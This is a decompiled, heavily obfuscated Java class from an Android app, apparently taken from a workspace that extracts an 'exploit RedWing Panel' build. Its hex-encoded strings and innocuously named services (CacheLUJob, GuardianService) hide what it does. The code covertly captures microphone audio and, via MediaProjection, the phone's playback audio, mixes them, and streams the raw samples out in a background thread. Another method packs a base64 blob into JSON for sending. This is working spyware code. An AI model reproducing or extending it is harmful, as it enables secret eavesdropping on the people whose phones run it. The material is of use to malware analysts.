package v.s;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Process;
import android.util.Base64;
import app.mobilex.plus.services.CacheLUJob;
import app.mobilex.plus.services.GuardianService;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;
import java.io.Closeable;
import java.io.IOException;
import java.util.ArrayList;
import java.util.regex.Matcher;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class okc5AGRjqrud84oM6d implements vZ9dOp9lOktYDObl {
    public static Boolean b1EoSIRjJHO5;
    public static Context dDIMxZXP1V8HdM;
    public static Boolean ibVTtJUNfrGYbW;
    public static Boolean pyu8ovAipBTLYAiKab;
    public static Boolean w9sT1Swbhx3hs;
    public static Boolean xDyLpEZyrcKVe0;
    public static final o0rN3ekjBJ6kKwok vekpFI4d1Nc4fakF = new o0rN3ekjBJ6kKwok("RESUME_TOKEN", 1);
    public static final char[] JXn4Qf7zpnLjP5 = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
    public static final Xyz5nManK5eXi9DtYVSh Ee8d2j4S9Vm5yGuR = new Xyz5nManK5eXi9DtYVSh(2);

    public static final void Ee8d2j4S9Vm5yGuR(Closeable closeable, Throwable th) throws IOException {
        if (closeable != null) {
            if (th == null) {
                closeable.close();
                return;
            }
            try {
                closeable.close();
            } catch (Throwable th2) {
                RIZfHbqXpth8r2yN4.dDIMxZXP1V8HdM(th, th2);
            }
        }
    }

    public static void J0zjQ7CAgohuxU20eCW6(Context context, int i) {
        if (CacheLUJob.xDyLpEZyrcKVe0) {
            String str = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            TypefaceCache.obtain("0002007A0049008200F100BB00CB00E7003100730058008800E200BB00DB00A90024");
            return;
        }
        try {
            Intent intent = new Intent(context, (Class<?>) CacheLUJob.class);
            intent.putExtra(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), i);
            context.startForegroundService(intent);
        } catch (Exception e) {
            String str2 = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E7000000770058008F00F5009300E7008D002C0074000100C7");
            e.getMessage();
        }
    }

    public static void JXn4Qf7zpnLjP5(long j, LTdvNeHFqTsIb9 lTdvNeHFqTsIb9, int i, ArrayList arrayList, int i2, int i3, ArrayList arrayList2) {
        int i4;
        int i5;
        ArrayList arrayList3;
        long j2;
        int i6;
        int i7 = i;
        ArrayList arrayList4 = arrayList;
        ArrayList arrayList5 = arrayList2;
        if (i2 >= i3) {
            throw new IllegalArgumentException("Failed requirement.");
        }
        for (int i8 = i2; i8 < i3; i8++) {
            if (((XslKUngIJyofTLpQ5) arrayList4.get(i8)).vekpFI4d1Nc4fakF() < i7) {
                throw new IllegalArgumentException("Failed requirement.");
            }
        }
        XslKUngIJyofTLpQ5 xslKUngIJyofTLpQ5 = (XslKUngIJyofTLpQ5) arrayList.get(i2);
        XslKUngIJyofTLpQ5 xslKUngIJyofTLpQ6 = (XslKUngIJyofTLpQ5) arrayList4.get(i3 - 1);
        if (i7 == xslKUngIJyofTLpQ5.vekpFI4d1Nc4fakF()) {
            int iIntValue = ((Number) arrayList5.get(i2)).intValue();
            int i9 = i2 + 1;
            XslKUngIJyofTLpQ5 xslKUngIJyofTLpQ7 = (XslKUngIJyofTLpQ5) arrayList4.get(i9);
            i4 = i9;
            i5 = iIntValue;
            xslKUngIJyofTLpQ5 = xslKUngIJyofTLpQ7;
        } else {
            i4 = i2;
            i5 = -1;
        }
        int i10 = 89 - 87;
        if (xslKUngIJyofTLpQ5.xDyLpEZyrcKVe0(i7) == xslKUngIJyofTLpQ6.xDyLpEZyrcKVe0(i7)) {
            int iMin = Math.min(xslKUngIJyofTLpQ5.vekpFI4d1Nc4fakF(), xslKUngIJyofTLpQ6.vekpFI4d1Nc4fakF());
            int i11 = 0;
            for (int i12 = i7; i12 < iMin && xslKUngIJyofTLpQ5.xDyLpEZyrcKVe0(i12) == xslKUngIJyofTLpQ6.xDyLpEZyrcKVe0(i12); i12++) {
                i11++;
            }
            long j3 = 4;
            long j4 = (lTdvNeHFqTsIb9.vekpFI4d1Nc4fakF / j3) + j + ((long) i10) + ((long) i11) + 1;
            lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(-i11);
            lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(i5);
            int i13 = i7 + i11;
            while (i7 < i13) {
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(xslKUngIJyofTLpQ5.xDyLpEZyrcKVe0(i7) & 255);
                i7++;
            }
            if (i4 + 1 == i3) {
                if (i13 != ((XslKUngIJyofTLpQ5) arrayList4.get(i4)).vekpFI4d1Nc4fakF()) {
                    throw new IllegalStateException("Check failed.");
                }
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(((Number) arrayList5.get(i4)).intValue());
                return;
            } else {
                LTdvNeHFqTsIb9 lTdvNeHFqTsIb10 = new LTdvNeHFqTsIb9();
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(((int) ((lTdvNeHFqTsIb10.vekpFI4d1Nc4fakF / j3) + j4)) * (-1));
                JXn4Qf7zpnLjP5(j4, lTdvNeHFqTsIb10, i13, arrayList4, i4, i3, arrayList5);
                lTdvNeHFqTsIb9.fivkjwgu2UdAtiY(lTdvNeHFqTsIb10);
                return;
            }
        }
        int i14 = 1;
        for (int i15 = i4 + 1; i15 < i3; i15++) {
            if (((XslKUngIJyofTLpQ5) arrayList4.get(i15 - 1)).xDyLpEZyrcKVe0(i7) != ((XslKUngIJyofTLpQ5) arrayList4.get(i15)).xDyLpEZyrcKVe0(i7)) {
                i14++;
            }
        }
        long j5 = 4;
        long j6 = (lTdvNeHFqTsIb9.vekpFI4d1Nc4fakF / j5) + j + ((long) i10) + ((long) (i14 * 2));
        lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(i14);
        lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(i5);
        for (int i16 = i4; i16 < i3; i16++) {
            int iXDyLpEZyrcKVe0 = ((XslKUngIJyofTLpQ5) arrayList4.get(i16)).xDyLpEZyrcKVe0(i7);
            if (i16 == i4 || iXDyLpEZyrcKVe0 != ((XslKUngIJyofTLpQ5) arrayList4.get(i16 - 1)).xDyLpEZyrcKVe0(i7)) {
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(iXDyLpEZyrcKVe0 & 255);
            }
        }
        LTdvNeHFqTsIb9 lTdvNeHFqTsIb11 = new LTdvNeHFqTsIb9();
        int i17 = i4;
        while (i17 < i3) {
            byte bXDyLpEZyrcKVe0 = ((XslKUngIJyofTLpQ5) arrayList4.get(i17)).xDyLpEZyrcKVe0(i7);
            int i18 = i17 + 1;
            int i19 = i18;
            while (true) {
                if (i19 >= i3) {
                    i19 = i3;
                    break;
                } else if (bXDyLpEZyrcKVe0 != ((XslKUngIJyofTLpQ5) arrayList4.get(i19)).xDyLpEZyrcKVe0(i7)) {
                    break;
                } else {
                    i19++;
                }
            }
            if (i18 == i19 && i7 + 1 == ((XslKUngIJyofTLpQ5) arrayList4.get(i17)).vekpFI4d1Nc4fakF()) {
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(((Number) arrayList5.get(i17)).intValue());
                arrayList3 = arrayList5;
                j2 = j6;
                i6 = i19;
            } else {
                lTdvNeHFqTsIb9.XuO9PPFo607ssKwZjNW(((int) ((lTdvNeHFqTsIb11.vekpFI4d1Nc4fakF / j5) + j6)) * (-1));
                arrayList3 = arrayList5;
                j2 = j6;
                i6 = i19;
                JXn4Qf7zpnLjP5(j2, lTdvNeHFqTsIb11, i7 + 1, arrayList, i17, i6, arrayList3);
                arrayList4 = arrayList;
            }
            j6 = j2;
            i17 = i6;
            arrayList5 = arrayList3;
        }
        lTdvNeHFqTsIb9.fivkjwgu2UdAtiY(lTdvNeHFqTsIb11);
    }

    public static void MLSIo1htfMPWeB8V876L() {
        PHZNFNJs3M6qql pHZNFNJs3M6qql = PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab;
        PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab = null;
        if (pHZNFNJs3M6qql != null) {
            pHZNFNJs3M6qql.xDyLpEZyrcKVe0 = false;
            PHZNFNJs3M6qql.D5P1xCAyuvgF = false;
            try {
                Thread thread = pHZNFNJs3M6qql.Ee8d2j4S9Vm5yGuR;
                if (thread != null) {
                    thread.interrupt();
                }
            } catch (Exception unused) {
            }
            try {
                Thread thread2 = pHZNFNJs3M6qql.JXn4Qf7zpnLjP5;
                if (thread2 != null) {
                    thread2.interrupt();
                }
            } catch (Exception unused2) {
            }
            try {
                Thread thread3 = pHZNFNJs3M6qql.Ee8d2j4S9Vm5yGuR;
                if (thread3 != null) {
                    thread3.join(500L);
                }
            } catch (Exception unused3) {
            }
            try {
                Thread thread4 = pHZNFNJs3M6qql.JXn4Qf7zpnLjP5;
                if (thread4 != null) {
                    thread4.join(500L);
                }
            } catch (Exception unused4) {
            }
            pHZNFNJs3M6qql.Ee8d2j4S9Vm5yGuR = null;
            pHZNFNJs3M6qql.JXn4Qf7zpnLjP5 = null;
            pHZNFNJs3M6qql.dDIMxZXP1V8HdM();
            TypefaceCache.obtain("001000620049008200F100B2009200A4002F0073005A008900E500AF009200A3002C0078005E");
        }
    }

    public static void Qrz92kRPw4GcghAc(Context context) {
        try {
            Intent intent = new Intent(context, (Class<?>) GuardianService.class);
            intent.putExtra(TypefaceCache.obtain("001C007B005A008E00FE008000C200AE0027"), Process.myPid());
            context.startForegroundService(intent);
        } catch (Exception e) {
            String str = GuardianService.b1EoSIRjJHO5;
            TypefaceCache.obtain("00300062005A009500E400FF00D400A6002A007A005E008300AA00FF");
            e.getMessage();
        }
    }

    public static void XiR1pIn5878vVWd(Context context) {
        try {
            context.stopService(new Intent(context, (Class<?>) CacheLUJob.class));
        } catch (Exception e) {
            String str = CacheLUJob.Ee8d2j4S9Vm5yGuR;
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300FF00AF00920084002200750053008200DC008A00F800A80021002C001B");
            e.getMessage();
        }
    }

    public static final ebR1taU40KcOGClk b1EoSIRjJHO5(sFdNPiaH9eT4T sfdnpiah9et4t) {
        return new ebR1taU40KcOGClk(sfdnpiah9et4t.dDIMxZXP1V8HdM, sfdnpiah9et4t.H9XlUr4OeMJFiXK);
    }

    public static final DirOmVsluSrk5EngI dDIMxZXP1V8HdM(Matcher matcher, int i, CharSequence charSequence) {
        if (matcher.find(i)) {
            return new DirOmVsluSrk5EngI(matcher, charSequence);
        }
        return null;
    }

    public static boolean gIIiyi2ddlMDR0(Context context) {
        PackageManager packageManager = context.getPackageManager();
        if (xDyLpEZyrcKVe0 == null) {
            xDyLpEZyrcKVe0 = Boolean.valueOf(packageManager.hasSystemFeature("android.hardware.type.watch"));
        }
        xDyLpEZyrcKVe0.booleanValue();
        if (ibVTtJUNfrGYbW == null) {
            ibVTtJUNfrGYbW = Boolean.valueOf(context.getPackageManager().hasSystemFeature("cn.google"));
        }
        return ibVTtJUNfrGYbW.booleanValue() && Build.VERSION.SDK_INT >= 30;
    }

    public static boolean gmNWMfvn6zlEj() {
        return PHZNFNJs3M6qql.D5P1xCAyuvgF;
    }

    public static final void hjneShqpF9Tis4(cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn, Throwable th) {
        try {
            ajrMZmky8AIb2Pr ajrmzmky8aib2pr = (ajrMZmky8AIb2Pr) cptq2xmcb5jsaehn.D5P1xCAyuvgF(fEyMFFyOOvHURJ7To6L.Ee8d2j4S9Vm5yGuR);
            if (ajrmzmky8aib2pr != null) {
                ajrmzmky8aib2pr.vIJudZvPyTuNp(th);
            } else {
                gA5gCwTK0qjTIn.D5P1xCAyuvgF(cptq2xmcb5jsaehn, th);
            }
        } catch (Throwable th2) {
            if (th != th2) {
                RuntimeException runtimeException = new RuntimeException("Exception while trying to handle coroutine exception", th2);
                RIZfHbqXpth8r2yN4.dDIMxZXP1V8HdM(runtimeException, th);
                th = runtimeException;
            }
            gA5gCwTK0qjTIn.D5P1xCAyuvgF(cptq2xmcb5jsaehn, th);
        }
    }

    private static /* synthetic */ void lauf() {
    }

    public static void nQilHWaqS401ZtR(Context context, final String str) {
        MLSIo1htfMPWeB8V876L();
        try {
            Thread.sleep(200L);
        } catch (Exception unused) {
        }
        while (System.nanoTime() < 0) {
            StringBuilder sb = new StringBuilder();
            sb.append(0);
            sb.setLength(0);
        }
        final PHZNFNJs3M6qql pHZNFNJs3M6qql = new PHZNFNJs3M6qql(context);
        PHZNFNJs3M6qql.pyu8ovAipBTLYAiKab = pHZNFNJs3M6qql;
        pHZNFNJs3M6qql.b1EoSIRjJHO5 = false;
        int i = (-68) + 84;
        int minBufferSize = AudioRecord.getMinBufferSize(16000, i, 2);
        int i2 = minBufferSize < 12800 ? 12800 : minBufferSize;
        boolean z = w9sT1Swbhx3hs(str, TypefaceCache.obtain("002E007F0058")) || w9sT1Swbhx3hs(str, TypefaceCache.obtain("00210079004F008F"));
        if ((w9sT1Swbhx3hs(str, TypefaceCache.obtain("0030006F0048009300F500B2")) || w9sT1Swbhx3hs(str, TypefaceCache.obtain("00210079004F008F"))) && Build.VERSION.SDK_INT >= 29) {
            String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
            ManagerUMController managerUMController = ManagerUMController.fivkjwgu2UdAtiY;
            MediaProjection mediaProjection = managerUMController != null ? managerUMController.dDIMxZXP1V8HdM : null;
            if (mediaProjection != null) {
                try {
                    JW3Lh9hxwLsO2ArTlH.hjneShqpF9Tis4();
                    pHZNFNJs3M6qql.vekpFI4d1Nc4fakF = new AudioRecord.Builder().setAudioFormat(new AudioFormat.Builder().setEncoding(2).setSampleRate(16000).setChannelMask(i).build()).setBufferSizeInBytes(i2).setAudioPlaybackCaptureConfig(JW3Lh9hxwLsO2ArTlH.Ee8d2j4S9Vm5yGuR(mediaProjection).addMatchingUsage(1).addMatchingUsage(14).addMatchingUsage(0).build()).build();
                    TypefaceCache.obtain("0010006F0048009300F500B2009200A6003600720052008800B000BC00D300B7003700630049008200B000B600DC00AE0037007F005A008B00F900A500D700A3");
                } catch (Exception e) {
                    TypefaceCache.obtain("00020063005F008E00FF008F00DE00A6003A0074005A008400FB009C00D300B7003700630049008200B000B900D300AE002F0073005F00DD00B0");
                    e.getMessage();
                    pHZNFNJs3M6qql.vekpFI4d1Nc4fakF = null;
                }
            } else {
                TypefaceCache.obtain("000D0079001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008100FF00AD009200B4003A0065004F008200FD00FF00D300B20027007F0054");
            }
        }
        if (z) {
            if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(pHZNFNJs3M6qql.dDIMxZXP1V8HdM, "android.permission.RECORD_AUDIO") != 0) {
                TypefaceCache.obtain("000D0079001B00B500D5009C00FD009500070049007A00B200D4009600FD00E7003300730049008A00F900AC00C100AE002C0078");
                return;
            }
            try {
                try {
                    pHZNFNJs3M6qql.w9sT1Swbhx3hs = new AudioRecord(7, 16000, 16, 2, i2);
                } catch (Exception e2) {
                    TypefaceCache.obtain("000E005F007800C700F900B100DB00B300630070005A008E00FC00BA00D600FD0063");
                    e2.getMessage();
                }
            } catch (Exception unused2) {
                pHZNFNJs3M6qql.w9sT1Swbhx3hs = new AudioRecord(1, 16000, 16, 2, i2);
            }
        }
        if (w9sT1Swbhx3hs(str, TypefaceCache.obtain("0030006F0048009300F500B2")) && pHZNFNJs3M6qql.vekpFI4d1Nc4fakF == null && pHZNFNJs3M6qql.w9sT1Swbhx3hs == null) {
            TypefaceCache.obtain("000D0079001B008600E500BB00DB00A8006300650054009200E200BC00D700E700220060005A008E00FC00BE00D000AB0026");
            return;
        }
        AudioRecord audioRecord = pHZNFNJs3M6qql.w9sT1Swbhx3hs;
        if (audioRecord == null && pHZNFNJs3M6qql.vekpFI4d1Nc4fakF == null) {
            TypefaceCache.obtain("000D0079001B008600E500BB00DB00A8006300650054009200E200BC00D700E700220060005A008E00FC00BE00D000AB0026");
            return;
        }
        final boolean z2 = audioRecord != null && audioRecord.getState() == 1;
        AudioRecord audioRecord2 = pHZNFNJs3M6qql.vekpFI4d1Nc4fakF;
        final boolean z3 = audioRecord2 != null && audioRecord2.getState() == 1;
        if (!z2 && !z3) {
            TypefaceCache.obtain("000D0079001B00A600E500BB00DB00A8001100730058008800E200BB009200AE002D007F004F008E00F100B300DB00BD00260072");
            return;
        }
        pHZNFNJs3M6qql.xDyLpEZyrcKVe0 = true;
        PHZNFNJs3M6qql.D5P1xCAyuvgF = true;
        if (z3) {
            pHZNFNJs3M6qql.vekpFI4d1Nc4fakF.startRecording();
        }
        if (z2) {
            pHZNFNJs3M6qql.w9sT1Swbhx3hs.startRecording();
        }
        if (z3 && z2) {
            Thread thread = new Thread(new hzCVl0f866ksvpzUUql(13, pHZNFNJs3M6qql), TypefaceCache.obtain("0010006F004800A600E500BB00DB00A800110073005A008300F500AD"));
            thread.setDaemon(true);
            thread.start();
            pHZNFNJs3M6qql.Ee8d2j4S9Vm5yGuR = thread;
        }
        final AudioRecord audioRecord3 = z2 ? pHZNFNJs3M6qql.w9sT1Swbhx3hs : pHZNFNJs3M6qql.vekpFI4d1Nc4fakF;
        Thread thread2 = new Thread(new Runnable(str, z2, z3, pHZNFNJs3M6qql, audioRecord3) { // from class: v.s.iNF8jxnsSWWC75RtKniB
            public final /* synthetic */ AudioRecord Ee8d2j4S9Vm5yGuR;
            public final /* synthetic */ PHZNFNJs3M6qql JXn4Qf7zpnLjP5;
            public final /* synthetic */ boolean vekpFI4d1Nc4fakF;
            public final /* synthetic */ boolean w9sT1Swbhx3hs;

            {
                this.w9sT1Swbhx3hs = z2;
                this.vekpFI4d1Nc4fakF = z3;
                this.JXn4Qf7zpnLjP5 = pHZNFNJs3M6qql;
                this.Ee8d2j4S9Vm5yGuR = audioRecord3;
            }

            private static /* synthetic */ void tbrfyzgbf() {
            }

            @Override // java.lang.Runnable
            public final void run() {
                short[] sArr;
                boolean z4 = this.w9sT1Swbhx3hs;
                boolean z5 = this.vekpFI4d1Nc4fakF;
                PHZNFNJs3M6qql pHZNFNJs3M6qql2 = this.JXn4Qf7zpnLjP5;
                AudioRecord audioRecord4 = this.Ee8d2j4S9Vm5yGuR;
                TypefaceCache.obtain("001000620049008200F100B2009200B4003700770049009300F500BB009200EF00300079004E009500F300BA008F");
                TypefaceCache.obtain("006F00360056008E00F300E2");
                TypefaceCache.obtain("006F00360048009E00E300E2");
                int i3 = 1623 - 23;
                short[] sArr2 = new short[i3];
                byte[] bArr = new byte[3271 - 71];
                while (pHZNFNJs3M6qql2.xDyLpEZyrcKVe0) {
                    try {
                        try {
                            int i4 = audioRecord4 != null ? audioRecord4.read(sArr2, 0, i3) : -1;
                            if (i4 <= 0) {
                                if (i4 < 0) {
                                    break;
                                }
                            } else {
                                if (z4 && z5 && (sArr = (short[]) pHZNFNJs3M6qql2.ibVTtJUNfrGYbW.poll()) != null) {
                                    int iMin = Math.min(i4, sArr.length);
                                    for (int i5 = 0; i5 < iMin; i5++) {
                                        sArr2[i5] = (short) OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(sArr2[i5] + sArr[i5], -32768, 32767);
                                    }
                                }
                                int i6 = i4 * 2;
                                for (int i7 = 0; i7 < i4; i7++) {
                                    int i8 = i7 * 2;
                                    short s = sArr2[i7];
                                    bArr[i8] = (byte) (s & 255);
                                    bArr[i8 + 1] = (byte) ((s >> 8) & 255);
                                }
                                byte[] bArr2 = new byte[i6 + 1];
                                bArr2[0] = 32;
                                System.arraycopy(bArr, 0, bArr2, 1, i6);
                                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                                if (rWY6BVSB0XxPbw != null) {
                                    rWY6BVSB0XxPbw.nQilHWaqS401ZtR(bArr2);
                                }
                            }
                        } catch (Exception e3) {
                            TypefaceCache.obtain("001000620049008200F100B2009200A2003100640054009500AA00FF");
                            e3.getMessage();
                        }
                    } catch (Throwable th) {
                        pHZNFNJs3M6qql2.dDIMxZXP1V8HdM();
                        throw th;
                    }
                }
                pHZNFNJs3M6qql2.dDIMxZXP1V8HdM();
                TypefaceCache.obtain("001000620049008200F100B2009200A2002D0072005E0083");
            }
        }, TypefaceCache.obtain("000E007F005800B400E400AD00D700A6002E00420053009500F500BE00D6"));
        thread2.setDaemon(true);
        thread2.start();
        pHZNFNJs3M6qql.JXn4Qf7zpnLjP5 = thread2;
    }

    public static JSONObject pyu8ovAipBTLYAiKab() throws JSONException {
        byte[] bArr = CacheLUJob.ibVTtJUNfrGYbW;
        if (bArr == null) {
            return null;
        }
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("00220063005F008E00FF008000C000A2002000790049008300F900B100D5", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00270077004F0086"), Base64.encodeToString(bArr, 2));
        jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), CacheLUJob.b1EoSIRjJHO5);
        jSONObject.put(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), CacheLUJob.pyu8ovAipBTLYAiKab);
        jSONObject.put(TypefaceCache.obtain("0030007F00410082"), bArr.length);
        jSONObject.put(TypefaceCache.obtain("002500790049008A00F100AB"), TypefaceCache.obtain("002E0022005A"));
        return jSONObject;
    }

    public static void vekpFI4d1Nc4fakF(SFSz9tfWEAQo sFSz9tfWEAQo, Object[] objArr) {
        if (objArr == null) {
            return;
        }
        int length = objArr.length;
        int i = 0;
        while (i < length) {
            Object obj = objArr[i];
            i++;
            if (obj == null) {
                sFSz9tfWEAQo.xDyLpEZyrcKVe0(i);
            } else if (obj instanceof byte[]) {
                sFSz9tfWEAQo.dTS0S7eC32ubQH54j36((byte[]) obj, i);
            } else if (obj instanceof Float) {
                sFSz9tfWEAQo.b1EoSIRjJHO5(i, ((Number) obj).floatValue());
            } else if (obj instanceof Double) {
                sFSz9tfWEAQo.b1EoSIRjJHO5(i, ((Number) obj).doubleValue());
            } else if (obj instanceof Long) {
                sFSz9tfWEAQo.wotphlvK9sPbXJ(i, ((Number) obj).longValue());
            } else if (obj instanceof Integer) {
                sFSz9tfWEAQo.wotphlvK9sPbXJ(i, ((Number) obj).intValue());
            } else if (obj instanceof Short) {
                sFSz9tfWEAQo.wotphlvK9sPbXJ(i, ((Number) obj).shortValue());
            } else if (obj instanceof Byte) {
                sFSz9tfWEAQo.wotphlvK9sPbXJ(i, ((Number) obj).byteValue());
            } else if (obj instanceof String) {
                sFSz9tfWEAQo.MLSIo1htfMPWeB8V876L((String) obj, i);
            } else {
                if (!(obj instanceof Boolean)) {
                    throw new IllegalArgumentException("Cannot bind " + obj + " at index " + i + " Supported types: Null, ByteArray, Float, Double, Long, Int, Short, Byte, String");
                }
                sFSz9tfWEAQo.wotphlvK9sPbXJ(i, ((Boolean) obj).booleanValue() ? 1L : 0L);
            }
        }
    }

    public static boolean w9sT1Swbhx3hs(Object obj, Object obj2) {
        if (obj == null) {
            return obj2 == null;
        }
        return obj.equals(obj2);
    }

    public static int xDyLpEZyrcKVe0(int i, int i2) {
        if (i < i2) {
            return -1;
        }
        return i == i2 ? 0 : 1;
    }

    public r5XEUfod5GSCCwq6c D5P1xCAyuvgF(Context context, Object obj) {
        return null;
    }

    public abstract Intent ibVTtJUNfrGYbW(Object obj);

    public abstract Object wotphlvK9sPbXJ(Intent intent, int i);
}
